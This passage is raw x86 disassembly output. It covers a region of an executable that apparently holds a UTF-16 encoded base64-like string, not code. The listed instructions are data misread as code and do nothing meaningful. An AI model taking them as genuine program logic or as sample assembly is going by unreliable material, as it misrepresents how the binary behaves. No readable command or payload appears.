  40a1c3:	00 63 00             	add    %ah,0x0(%ebx)
  40a1c6:	49                   	dec    %ecx
  40a1c7:	00 76 00             	add    %dh,0x0(%esi)
  40a1ca:	38 00                	cmp    %al,(%eax)
  40a1cc:	6c                   	insb   (%dx),%es:(%edi)
  40a1cd:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40a1d1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1d4:	47                   	inc    %edi
  40a1d5:	00 6a 00             	add    %ch,0x0(%edx)
  40a1d8:	47                   	inc    %edi
  40a1d9:	00 55 00             	add    %dl,0x0(%ebp)
  40a1dc:	71 00                	jno    0x40a1de
  40a1de:	6a 00                	push   $0x0
  40a1e0:	39 00                	cmp    %eax,(%eax)
  40a1e2:	39 00                	cmp    %eax,(%eax)
  40a1e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1e5:	00 47 00             	add    %al,0x0(%edi)
  40a1e8:	55                   	push   %ebp
  40a1e9:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a1ed:	00 57 00             	add    %dl,0x0(%edi)
  40a1f0:	58                   	pop    %eax
  40a1f1:	00 43 00             	add    %al,0x0(%ebx)
  40a1f4:	49                   	dec    %ecx
  40a1f5:	00 52 00             	add    %dl,0x0(%edx)
  40a1f8:	57                   	push   %edi
  40a1f9:	00 6e 00             	add    %ch,0x0(%esi)
  40a1fc:	33 00                	xor    (%eax),%eax
  40a1fe:	61                   	popa
  40a1ff:	00 4f 00             	add    %cl,0x0(%edi)
  40a202:	44                   	inc    %esp
  40a203:	00 35 00 56 00 51    	add    %dh,0x51005600
  40a209:	00 39                	add    %bh,(%ecx)
  40a20b:	00 6f 00             	add    %ch,0x0(%edi)
  40a20e:	48                   	dec    %eax
  40a20f:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40a213:	00 35 00 77 00 66    	add    %dh,0x66007700
  40a219:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40a21d:	00 50 00             	add    %dl,0x0(%eax)
  40a220:	54                   	push   %esp
  40a221:	00 6a 00             	add    %ch,0x0(%edx)
  40a224:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40a228:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40a22c:	61                   	popa
  40a22d:	00 78 00             	add    %bh,0x0(%eax)
  40a230:	55                   	push   %ebp
  40a231:	00 4f 00             	add    %cl,0x0(%edi)
  40a234:	71 00                	jno    0x40a236
  40a236:	68 00 68 00 63       	push   $0x63006800
  40a23b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a23e:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a241:	00 69 00             	add    %ch,0x0(%ecx)
  40a244:	6f                   	outsl  %ds:(%esi),(%dx)
  40a245:	00 75 00             	add    %dh,0x0(%ebp)
  40a248:	72 00                	jb     0x40a24a
  40a24a:	49                   	dec    %ecx
  40a24b:	00 38                	add    %bh,(%eax)
  40a24d:	00 71 00             	add    %dh,0x0(%ecx)
  40a250:	59                   	pop    %ecx
  40a251:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40a255:	00 50 00             	add    %dl,0x0(%eax)
  40a258:	56                   	push   %esi
  40a259:	00 7a 00             	add    %bh,0x0(%edx)
  40a25c:	48                   	dec    %eax
  40a25d:	00 5a 00             	add    %bl,0x0(%edx)
  40a260:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a264:	31 00                	xor    %eax,(%eax)
  40a266:	67 00 6d 00          	add    %ch,0x0(%di)
  40a26a:	36 00 35 00 32 00 42 	add    %dh,%ss:0x42003200
  40a271:	00 59 00             	add    %bl,0x0(%ecx)
  40a274:	38 00                	cmp    %al,(%eax)
  40a276:	48                   	dec    %eax
  40a277:	00 38                	add    %bh,(%eax)
  40a279:	00 59 00             	add    %bl,0x0(%ecx)
  40a27c:	70 00                	jo     0x40a27e
  40a27e:	73 00                	jae    0x40a280
  40a280:	2b 00                	sub    (%eax),%eax
  40a282:	77 00                	ja     0x40a284
  40a284:	4f                   	dec    %edi
  40a285:	00 38                	add    %bh,(%eax)
  40a287:	00 31                	add    %dh,(%ecx)
  40a289:	00 61 00             	add    %ah,0x0(%ecx)
  40a28c:	55                   	push   %ebp
  40a28d:	00 43 00             	add    %al,0x0(%ebx)
  40a290:	30 00                	xor    %al,(%eax)
  40a292:	58                   	pop    %eax
  40a293:	00 43 00             	add    %al,0x0(%ebx)
  40a296:	30 00                	xor    %al,(%eax)
  40a298:	79 00                	jns    0x40a29a
  40a29a:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a29d:	00 35 00 48 00 66    	add    %dh,0x66004800
  40a2a3:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40a2a7:	00 63 00             	add    %ah,0x0(%ebx)
  40a2aa:	72 00                	jb     0x40a2ac
  40a2ac:	74 00                	je     0x40a2ae
  40a2ae:	31 00                	xor    %eax,(%eax)
  40a2b0:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a2b4:	37                   	aaa
  40a2b5:	00 75 00             	add    %dh,0x0(%ebp)
  40a2b8:	58                   	pop    %eax
  40a2b9:	00 6a 00             	add    %ch,0x0(%edx)
  40a2bc:	54                   	push   %esp
  40a2bd:	00 52 00             	add    %dl,0x0(%edx)
  40a2c0:	56                   	push   %esi
  40a2c1:	00 43 00             	add    %al,0x0(%ebx)
  40a2c4:	66 00 38             	data16 add %bh,(%eax)
  40a2c7:	00 43 00             	add    %al,0x0(%ebx)
  40a2ca:	73 00                	jae    0x40a2cc
  40a2cc:	44                   	inc    %esp
  40a2cd:	00 4a 00             	add    %cl,0x0(%edx)
  40a2d0:	68 00 79 00 4c       	push   $0x4c007900
  40a2d5:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40a2d9:	00 63 00             	add    %ah,0x0(%ebx)
  40a2dc:	2f                   	das
  40a2dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2e0:	31 00                	xor    %eax,(%eax)
  40a2e2:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40a2e6:	41                   	inc    %ecx
  40a2e7:	00 56 00             	add    %dl,0x0(%esi)
  40a2ea:	63 00                	arpl   %eax,(%eax)
  40a2ec:	78 00                	js     0x40a2ee
  40a2ee:	41                   	inc    %ecx
  40a2ef:	00 59 00             	add    %bl,0x0(%ecx)
  40a2f2:	30 00                	xor    %al,(%eax)
  40a2f4:	78 00                	js     0x40a2f6
  40a2f6:	68 00 6d 00 6a       	push   $0x6a006d00
  40a2fb:	00 65 00             	add    %ah,0x0(%ebp)
  40a2fe:	48                   	dec    %eax
  40a2ff:	00 76 00             	add    %dh,0x0(%esi)
  40a302:	4b                   	dec    %ebx
  40a303:	00 7a 00             	add    %bh,0x0(%edx)
  40a306:	4b                   	dec    %ebx
  40a307:	00 48 00             	add    %cl,0x0(%eax)
  40a30a:	64 00 32             	add    %dh,%fs:(%edx)
  40a30d:	00 68 00             	add    %ch,0x0(%eax)
  40a310:	53                   	push   %ebx
  40a311:	00 46 00             	add    %al,0x0(%esi)
  40a314:	59                   	pop    %ecx
  40a315:	00 48 00             	add    %cl,0x0(%eax)
  40a318:	4a                   	dec    %edx
  40a319:	00 5a 00             	add    %bl,0x0(%edx)
  40a31c:	46                   	inc    %esi
  40a31d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a320:	61                   	popa
  40a321:	00 79 00             	add    %bh,0x0(%ecx)
  40a324:	4c                   	dec    %esp
  40a325:	00 7a 00             	add    %bh,0x0(%edx)
  40a328:	39 00                	cmp    %eax,(%eax)
  40a32a:	72 00                	jb     0x40a32c
  40a32c:	58                   	pop    %eax
  40a32d:	00 45 00             	add    %al,0x0(%ebp)
  40a330:	7a 00                	jp     0x40a332
  40a332:	33 00                	xor    (%eax),%eax
  40a334:	4b                   	dec    %ebx
  40a335:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40a339:	00 58 00             	add    %bl,0x0(%eax)
  40a33c:	5a                   	pop    %edx
  40a33d:	00 51 00             	add    %dl,0x0(%ecx)
  40a340:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40a344:	69 00 48 00 36 00    	imul   $0x360048,(%eax),%eax
  40a34a:	59                   	pop    %ecx
  40a34b:	00 46 00             	add    %al,0x0(%esi)
  40a34e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a34f:	00 31                	add    %dh,(%ecx)
  40a351:	00 47 00             	add    %al,0x0(%edi)
  40a354:	79 00                	jns    0x40a356
  40a356:	50                   	push   %eax
  40a357:	00 32                	add    %dh,(%edx)
  40a359:	00 76 00             	add    %dh,0x0(%esi)
  40a35c:	41                   	inc    %ecx
  40a35d:	00 6a 00             	add    %ch,0x0(%edx)
  40a360:	58                   	pop    %eax
  40a361:	00 42 00             	add    %al,0x0(%edx)
  40a364:	6f                   	outsl  %ds:(%esi),(%dx)
  40a365:	00 45 00             	add    %al,0x0(%ebp)
  40a368:	74 00                	je     0x40a36a
  40a36a:	54                   	push   %esp
  40a36b:	00 62 00             	add    %ah,0x0(%edx)
  40a36e:	4b                   	dec    %ebx
  40a36f:	00 33                	add    %dh,(%ebx)
  40a371:	00 58 00             	add    %bl,0x0(%eax)
  40a374:	78 00                	js     0x40a376
  40a376:	69 00 39 00 74 00    	imul   $0x740039,(%eax),%eax
  40a37c:	4c                   	dec    %esp
  40a37d:	00 52 00             	add    %dl,0x0(%edx)
  40a380:	37                   	aaa
  40a381:	00 43 00             	add    %al,0x0(%ebx)
  40a384:	30 00                	xor    %al,(%eax)
  40a386:	74 00                	je     0x40a388
  40a388:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a38b:	00 2f                	add    %ch,(%edi)
  40a38d:	00 4a 00             	add    %cl,0x0(%edx)
  40a390:	50                   	push   %eax
  40a391:	00 42 00             	add    %al,0x0(%edx)
  40a394:	69 00 63 00 38 00    	imul   $0x380063,(%eax),%eax
  40a39a:	41                   	inc    %ecx
  40a39b:	00 6a 00             	add    %ch,0x0(%edx)
  40a39e:	4c                   	dec    %esp
  40a39f:	00 75 00             	add    %dh,0x0(%ebp)
  40a3a2:	4f                   	dec    %edi
  40a3a3:	00 43 00             	add    %al,0x0(%ebx)
  40a3a6:	55                   	push   %ebp
  40a3a7:	00 30                	add    %dh,(%eax)
  40a3a9:	00 62 00             	add    %ah,0x0(%edx)
  40a3ac:	4a                   	dec    %edx
  40a3ad:	00 59 00             	add    %bl,0x0(%ecx)
  40a3b0:	6b 00 42             	imul   $0x42,(%eax),%eax
  40a3b3:	00 55 00             	add    %dl,0x0(%ebp)
  40a3b6:	6b 00 72             	imul   $0x72,(%eax),%eax
  40a3b9:	00 50 00             	add    %dl,0x0(%eax)
  40a3bc:	45                   	inc    %ebp
  40a3bd:	00 47 00             	add    %al,0x0(%edi)
  40a3c0:	46                   	inc    %esi
  40a3c1:	00 66 00             	add    %ah,0x0(%esi)
  40a3c4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3c5:	00 7a 00             	add    %bh,0x0(%edx)
  40a3c8:	74 00                	je     0x40a3ca
  40a3ca:	37                   	aaa
  40a3cb:	00 77 00             	add    %dh,0x0(%edi)
  40a3ce:	50                   	push   %eax
  40a3cf:	00 50 00             	add    %dl,0x0(%eax)
  40a3d2:	38 00                	cmp    %al,(%eax)
  40a3d4:	6a 00                	push   $0x0
  40a3d6:	4c                   	dec    %esp
  40a3d7:	00 52 00             	add    %dl,0x0(%edx)
  40a3da:	33 00                	xor    (%eax),%eax
  40a3dc:	70 00                	jo     0x40a3de
  40a3de:	6a 00                	push   $0x0
  40a3e0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3e1:	00 4e 00             	add    %cl,0x0(%esi)
  40a3e4:	4d                   	dec    %ebp
  40a3e5:	00 37                	add    %dh,(%edi)
  40a3e7:	00 52 00             	add    %dl,0x0(%edx)
  40a3ea:	4e                   	dec    %esi
  40a3eb:	00 50 00             	add    %dl,0x0(%eax)
  40a3ee:	58                   	pop    %eax
  40a3ef:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40a3f3:	00 7a 00             	add    %bh,0x0(%edx)
  40a3f6:	48                   	dec    %eax
  40a3f7:	00 31                	add    %dh,(%ecx)
  40a3f9:	00 43 00             	add    %al,0x0(%ebx)
  40a3fc:	44                   	inc    %esp
  40a3fd:	00 4f 00             	add    %cl,0x0(%edi)
  40a400:	63 00                	arpl   %eax,(%eax)
  40a402:	75 00                	jne    0x40a404
  40a404:	63 00                	arpl   %eax,(%eax)
  40a406:	44                   	inc    %esp
  40a407:	00 45 00             	add    %al,0x0(%ebp)
  40a40a:	5a                   	pop    %edx
  40a40b:	00 55 00             	add    %dl,0x0(%ebp)
  40a40e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a40f:	00 7a 00             	add    %bh,0x0(%edx)
  40a412:	54                   	push   %esp
  40a413:	00 45 00             	add    %al,0x0(%ebp)
  40a416:	6a 00                	push   $0x0
  40a418:	54                   	push   %esp
  40a419:	00 6b 00             	add    %ch,0x0(%ebx)
  40a41c:	54                   	push   %esp
  40a41d:	00 30                	add    %dh,(%eax)
  40a41f:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a423:	00 79 00             	add    %bh,0x0(%ecx)
  40a426:	51                   	push   %ecx
  40a427:	00 42 00             	add    %al,0x0(%edx)
  40a42a:	73 00                	jae    0x40a42c
  40a42c:	46                   	inc    %esi
  40a42d:	00 68 00             	add    %ch,0x0(%eax)
  40a430:	77 00                	ja     0x40a432
  40a432:	7a 00                	jp     0x40a434
  40a434:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a438:	49                   	dec    %ecx
  40a439:	00 71 00             	add    %dh,0x0(%ecx)
  40a43c:	52                   	push   %edx
  40a43d:	00 43 00             	add    %al,0x0(%ebx)
  40a440:	56                   	push   %esi
  40a441:	00 70 00             	add    %dh,0x0(%eax)
  40a444:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40a447:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40a44b:	00 78 00             	add    %bh,0x0(%eax)
  40a44e:	4d                   	dec    %ebp
  40a44f:	00 61 00             	add    %ah,0x0(%ecx)
  40a452:	64 00 38             	add    %bh,%fs:(%eax)
  40a455:	00 62 00             	add    %ah,0x0(%edx)
  40a458:	77 00                	ja     0x40a45a
  40a45a:	46                   	inc    %esi
  40a45b:	00 53 00             	add    %dl,0x0(%ebx)
  40a45e:	46                   	inc    %esi
  40a45f:	00 47 00             	add    %al,0x0(%edi)
  40a462:	44                   	inc    %esp
  40a463:	00 49 00             	add    %cl,0x0(%ecx)
  40a466:	77 00                	ja     0x40a468
  40a468:	72 00                	jb     0x40a46a
  40a46a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a46b:	00 5a 00             	add    %bl,0x0(%edx)
  40a46e:	7a 00                	jp     0x40a470
  40a470:	64 00 37             	add    %dh,%fs:(%edi)
  40a473:	00 35 00 43 00 73    	add    %dh,0x73004300
  40a479:	00 37                	add    %dh,(%edi)
  40a47b:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40a47f:	00 72 00             	add    %dh,0x0(%edx)
  40a482:	78 00                	js     0x40a484
  40a484:	72 00                	jb     0x40a486
  40a486:	74 00                	je     0x40a488
  40a488:	59                   	pop    %ecx
  40a489:	00 4d 00             	add    %cl,0x0(%ebp)
  40a48c:	6c                   	insb   (%dx),%es:(%edi)
  40a48d:	00 63 00             	add    %ah,0x0(%ebx)
  40a490:	69 00 79 00 72 00    	imul   $0x720079,(%eax),%eax
  40a496:	42                   	inc    %edx
  40a497:	00 58 00             	add    %bl,0x0(%eax)
  40a49a:	4a                   	dec    %edx
  40a49b:	00 79 00             	add    %bh,0x0(%ecx)
  40a49e:	39 00                	cmp    %eax,(%eax)
  40a4a0:	42                   	inc    %edx
  40a4a1:	00 53 00             	add    %dl,0x0(%ebx)
  40a4a4:	5a                   	pop    %edx
  40a4a5:	00 33                	add    %dh,(%ebx)
  40a4a7:	00 55 00             	add    %dl,0x0(%ebp)
  40a4aa:	5a                   	pop    %edx
  40a4ab:	00 57 00             	add    %dl,0x0(%edi)
  40a4ae:	64 00 30             	add    %dh,%fs:(%eax)
  40a4b1:	00 33                	add    %dh,(%ebx)
  40a4b3:	00 66 00             	add    %ah,0x0(%esi)
  40a4b6:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40a4ba:	64 00 37             	add    %dh,%fs:(%edi)
  40a4bd:	00 47 00             	add    %al,0x0(%edi)
  40a4c0:	37                   	aaa
  40a4c1:	00 75 00             	add    %dh,0x0(%ebp)
  40a4c4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4c5:	00 46 00             	add    %al,0x0(%esi)
  40a4c8:	69 00 52 00 49 00    	imul   $0x490052,(%eax),%eax
  40a4ce:	33 00                	xor    (%eax),%eax
  40a4d0:	6a 00                	push   $0x0
  40a4d2:	57                   	push   %edi
  40a4d3:	00 32                	add    %dh,(%edx)
  40a4d5:	00 62 00             	add    %ah,0x0(%edx)
  40a4d8:	6c                   	insb   (%dx),%es:(%edi)
  40a4d9:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40a4dd:	00 32                	add    %dh,(%edx)
  40a4df:	00 6d 00             	add    %ch,0x0(%ebp)
  40a4e2:	43                   	inc    %ebx
  40a4e3:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40a4e7:	00 4f 00             	add    %cl,0x0(%edi)
  40a4ea:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4eb:	00 76 00             	add    %dh,0x0(%esi)
  40a4ee:	52                   	push   %edx
  40a4ef:	00 50 00             	add    %dl,0x0(%eax)
  40a4f2:	72 00                	jb     0x40a4f4
  40a4f4:	43                   	inc    %ebx
  40a4f5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4f8:	67 00 31             	add    %dh,(%bx,%di)
  40a4fb:	00 4a 00             	add    %cl,0x0(%edx)
  40a4fe:	33 00                	xor    (%eax),%eax
  40a500:	45                   	inc    %ebp
  40a501:	00 75 00             	add    %dh,0x0(%ebp)
  40a504:	4d                   	dec    %ebp
  40a505:	00 58 00             	add    %bl,0x0(%eax)
  40a508:	5a                   	pop    %edx
  40a509:	00 45 00             	add    %al,0x0(%ebp)
  40a50c:	41                   	inc    %ecx
  40a50d:	00 79 00             	add    %bh,0x0(%ecx)
  40a510:	61                   	popa
  40a511:	00 6d 00             	add    %ch,0x0(%ebp)
  40a514:	77 00                	ja     0x40a516
  40a516:	59                   	pop    %ecx
  40a517:	00 72 00             	add    %dh,0x0(%edx)
  40a51a:	38 00                	cmp    %al,(%eax)
  40a51c:	50                   	push   %eax
  40a51d:	00 31                	add    %dh,(%ecx)
  40a51f:	00 69 00             	add    %ch,0x0(%ecx)
  40a522:	69 00 61 00 58 00    	imul   $0x580061,(%eax),%eax
  40a528:	75 00                	jne    0x40a52a
  40a52a:	66 00 54 00 69       	data16 add %dl,0x69(%eax,%eax,1)
  40a52f:	00 61 00             	add    %ah,0x0(%ecx)
  40a532:	47                   	inc    %edi
  40a533:	00 58 00             	add    %bl,0x0(%eax)
  40a536:	45                   	inc    %ebp
  40a537:	00 4b 00             	add    %cl,0x0(%ebx)
  40a53a:	75 00                	jne    0x40a53c
  40a53c:	35 00 66 00 44       	xor    $0x44006600,%eax
  40a541:	00 45 00             	add    %al,0x0(%ebp)
  40a544:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a548:	34 00                	xor    $0x0,%al
  40a54a:	4d                   	dec    %ebp
  40a54b:	00 48 00             	add    %cl,0x0(%eax)
  40a54e:	41                   	inc    %ecx
  40a54f:	00 66 00             	add    %ah,0x0(%esi)
  40a552:	53                   	push   %ebx
  40a553:	00 46 00             	add    %al,0x0(%esi)
  40a556:	69 00 31 00 77 00    	imul   $0x770031,(%eax),%eax
  40a55c:	6c                   	insb   (%dx),%es:(%edi)
  40a55d:	00 75 00             	add    %dh,0x0(%ebp)
  40a560:	63 00                	arpl   %eax,(%eax)
  40a562:	41                   	inc    %ecx
  40a563:	00 67 00             	add    %ah,0x0(%edi)
  40a566:	53                   	push   %ebx
  40a567:	00 53 00             	add    %dl,0x0(%ebx)
  40a56a:	71 00                	jno    0x40a56c
  40a56c:	44                   	inc    %esp
  40a56d:	00 71 00             	add    %dh,0x0(%ecx)
  40a570:	47                   	inc    %edi
  40a571:	00 68 00             	add    %ch,0x0(%eax)
  40a574:	58                   	pop    %eax
  40a575:	00 31                	add    %dh,(%ecx)
  40a577:	00 35 00 70 00 32    	add    %dh,0x32007000
  40a57d:	00 58 00             	add    %bl,0x0(%eax)
  40a580:	43                   	inc    %ebx
  40a581:	00 69 00             	add    %ch,0x0(%ecx)
  40a584:	78 00                	js     0x40a586
  40a586:	4c                   	dec    %esp
  40a587:	00 47 00             	add    %al,0x0(%edi)
  40a58a:	34 00                	xor    $0x0,%al
  40a58c:	41                   	inc    %ecx
  40a58d:	00 42 00             	add    %al,0x0(%edx)
  40a590:	7a 00                	jp     0x40a592
  40a592:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a596:	68 00 69 00 59       	push   $0x59006900
  40a59b:	00 45 00             	add    %al,0x0(%ebp)
  40a59e:	32 00                	xor    (%eax),%al
  40a5a0:	78 00                	js     0x40a5a2
  40a5a2:	70 00                	jo     0x40a5a4
  40a5a4:	6a 00                	push   $0x0
  40a5a6:	79 00                	jns    0x40a5a8
  40a5a8:	75 00                	jne    0x40a5aa
  40a5aa:	7a 00                	jp     0x40a5ac
  40a5ac:	4b                   	dec    %ebx
  40a5ad:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5b0:	63 00                	arpl   %eax,(%eax)
  40a5b2:	54                   	push   %esp
  40a5b3:	00 42 00             	add    %al,0x0(%edx)
  40a5b6:	38 00                	cmp    %al,(%eax)
  40a5b8:	68 00 64 00 31       	push   $0x31006400
  40a5bd:	00 35 00 67 00 36    	add    %dh,0x36006700
  40a5c3:	00 4e 00             	add    %cl,0x0(%esi)
  40a5c6:	33 00                	xor    (%eax),%eax
  40a5c8:	4d                   	dec    %ebp
  40a5c9:	00 65 00             	add    %ah,0x0(%ebp)
  40a5cc:	77 00                	ja     0x40a5ce
  40a5ce:	48                   	dec    %eax
  40a5cf:	00 38                	add    %bh,(%eax)
  40a5d1:	00 51 00             	add    %dl,0x0(%ecx)
  40a5d4:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40a5d8:	6d                   	insl   (%dx),%es:(%edi)
  40a5d9:	00 72 00             	add    %dh,0x0(%edx)
  40a5dc:	58                   	pop    %eax
  40a5dd:	00 37                	add    %dh,(%edi)
  40a5df:	00 66 00             	add    %ah,0x0(%esi)
  40a5e2:	72 00                	jb     0x40a5e4
  40a5e4:	4c                   	dec    %esp
  40a5e5:	00 56 00             	add    %dl,0x0(%esi)
  40a5e8:	45                   	inc    %ebp
  40a5e9:	00 50 00             	add    %dl,0x0(%eax)
  40a5ec:	75 00                	jne    0x40a5ee
  40a5ee:	69 00 78 00 34 00    	imul   $0x340078,(%eax),%eax
  40a5f4:	74 00                	je     0x40a5f6
  40a5f6:	52                   	push   %edx
  40a5f7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5fa:	70 00                	jo     0x40a5fc
  40a5fc:	33 00                	xor    (%eax),%eax
  40a5fe:	72 00                	jb     0x40a600
  40a600:	7a 00                	jp     0x40a602
  40a602:	42                   	inc    %edx
  40a603:	00 4d 00             	add    %cl,0x0(%ebp)
  40a606:	2b 00                	sub    (%eax),%eax
  40a608:	6d                   	insl   (%dx),%es:(%edi)
  40a609:	00 35 00 73 00 5a    	add    %dh,0x5a007300
  40a60f:	00 42 00             	add    %al,0x0(%edx)
  40a612:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a616:	57                   	push   %edi
  40a617:	00 55 00             	add    %dl,0x0(%ebp)
  40a61a:	7a 00                	jp     0x40a61c
  40a61c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a61d:	00 39                	add    %bh,(%ecx)
  40a61f:	00 77 00             	add    %dh,0x0(%edi)
  40a622:	45                   	inc    %ebp
  40a623:	00 2f                	add    %ch,(%edi)
  40a625:	00 55 00             	add    %dl,0x0(%ebp)
  40a628:	4d                   	dec    %ebp
  40a629:	00 2f                	add    %ch,(%edi)
  40a62b:	00 4a 00             	add    %cl,0x0(%edx)
  40a62e:	49                   	dec    %ecx
  40a62f:	00 4e 00             	add    %cl,0x0(%esi)
  40a632:	38 00                	cmp    %al,(%eax)
  40a634:	79 00                	jns    0x40a636
  40a636:	74 00                	je     0x40a638
  40a638:	42                   	inc    %edx
  40a639:	00 66 00             	add    %ah,0x0(%esi)
  40a63c:	71 00                	jno    0x40a63e
  40a63e:	4c                   	dec    %esp
  40a63f:	00 6f 00             	add    %ch,0x0(%edi)
  40a642:	2f                   	das
  40a643:	00 39                	add    %bh,(%ecx)
  40a645:	00 62 00             	add    %ah,0x0(%edx)
  40a648:	32 00                	xor    (%eax),%al
  40a64a:	79 00                	jns    0x40a64c
  40a64c:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a650:	46                   	inc    %esi
  40a651:	00 4a 00             	add    %cl,0x0(%edx)
  40a654:	66 00 32             	data16 add %dh,(%edx)
  40a657:	00 33                	add    %dh,(%ebx)
  40a659:	00 59 00             	add    %bl,0x0(%ecx)
  40a65c:	37                   	aaa
  40a65d:	00 37                	add    %dh,(%edi)
  40a65f:	00 51 00             	add    %dl,0x0(%ecx)
  40a662:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a666:	70 00                	jo     0x40a668
  40a668:	7a 00                	jp     0x40a66a
  40a66a:	34 00                	xor    $0x0,%al
  40a66c:	57                   	push   %edi
  40a66d:	00 35 00 64 00 4a    	add    %dh,0x4a006400
  40a673:	00 38                	add    %bh,(%eax)
  40a675:	00 50 00             	add    %dl,0x0(%eax)
  40a678:	71 00                	jno    0x40a67a
  40a67a:	7a 00                	jp     0x40a67c
  40a67c:	66 00 2b             	data16 add %ch,(%ebx)
  40a67f:	00 55 00             	add    %dl,0x0(%ebp)
  40a682:	79 00                	jns    0x40a684
  40a684:	68 00 6b 00 6a       	push   $0x6a006b00
  40a689:	00 71 00             	add    %dh,0x0(%ecx)
  40a68c:	76 00                	jbe    0x40a68e
  40a68e:	48                   	dec    %eax
  40a68f:	00 5a 00             	add    %bl,0x0(%edx)
  40a692:	47                   	inc    %edi
  40a693:	00 78 00             	add    %bh,0x0(%eax)
  40a696:	73 00                	jae    0x40a698
  40a698:	4a                   	dec    %edx
  40a699:	00 39                	add    %bh,(%ecx)
  40a69b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a69e:	4f                   	dec    %edi
  40a69f:	00 2f                	add    %ch,(%edi)
  40a6a1:	00 6e 00             	add    %ch,0x0(%esi)
  40a6a4:	7a 00                	jp     0x40a6a6
  40a6a6:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a6a9:	00 46 00             	add    %al,0x0(%esi)
  40a6ac:	2b 00                	sub    (%eax),%eax
  40a6ae:	52                   	push   %edx
  40a6af:	00 32                	add    %dh,(%edx)
  40a6b1:	00 43 00             	add    %al,0x0(%ebx)
  40a6b4:	74 00                	je     0x40a6b6
  40a6b6:	6a 00                	push   $0x0
  40a6b8:	69 00 54 00 78 00    	imul   $0x780054,(%eax),%eax
  40a6be:	56                   	push   %esi
  40a6bf:	00 46 00             	add    %al,0x0(%esi)
  40a6c2:	50                   	push   %eax
  40a6c3:	00 75 00             	add    %dh,0x0(%ebp)
  40a6c6:	70 00                	jo     0x40a6c8
  40a6c8:	7a 00                	jp     0x40a6ca
  40a6ca:	53                   	push   %ebx
  40a6cb:	00 5a 00             	add    %bl,0x0(%edx)
  40a6ce:	39 00                	cmp    %eax,(%eax)
  40a6d0:	72 00                	jb     0x40a6d2
  40a6d2:	47                   	inc    %edi
  40a6d3:	00 65 00             	add    %ah,0x0(%ebp)
  40a6d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6d7:	00 47 00             	add    %al,0x0(%edi)
  40a6da:	33 00                	xor    (%eax),%eax
  40a6dc:	2f                   	das
  40a6dd:	00 53 00             	add    %dl,0x0(%ebx)
  40a6e0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6e1:	00 46 00             	add    %al,0x0(%esi)
  40a6e4:	50                   	push   %eax
  40a6e5:	00 36                	add    %dh,(%esi)
  40a6e7:	00 2b                	add    %ch,(%ebx)
  40a6e9:	00 2f                	add    %ch,(%edi)
  40a6eb:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40a6ef:	00 39                	add    %bh,(%ecx)
  40a6f1:	00 43 00             	add    %al,0x0(%ebx)
  40a6f4:	4a                   	dec    %edx
  40a6f5:	00 32                	add    %dh,(%edx)
  40a6f7:	00 53 00             	add    %dl,0x0(%ebx)
  40a6fa:	59                   	pop    %ecx
  40a6fb:	00 57 00             	add    %dl,0x0(%edi)
  40a6fe:	57                   	push   %edi
  40a6ff:	00 53 00             	add    %dl,0x0(%ebx)
  40a702:	4b                   	dec    %ebx
  40a703:	00 32                	add    %dh,(%edx)
  40a705:	00 2f                	add    %ch,(%edi)
  40a707:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40a70b:	00 6f 00             	add    %ch,0x0(%edi)
  40a70e:	62 00                	bound  %eax,(%eax)
  40a710:	41                   	inc    %ecx
  40a711:	00 4b 00             	add    %cl,0x0(%ebx)
  40a714:	7a 00                	jp     0x40a716
  40a716:	62 00                	bound  %eax,(%eax)
  40a718:	59                   	pop    %ecx
  40a719:	00 59 00             	add    %bl,0x0(%ecx)
  40a71c:	78 00                	js     0x40a71e
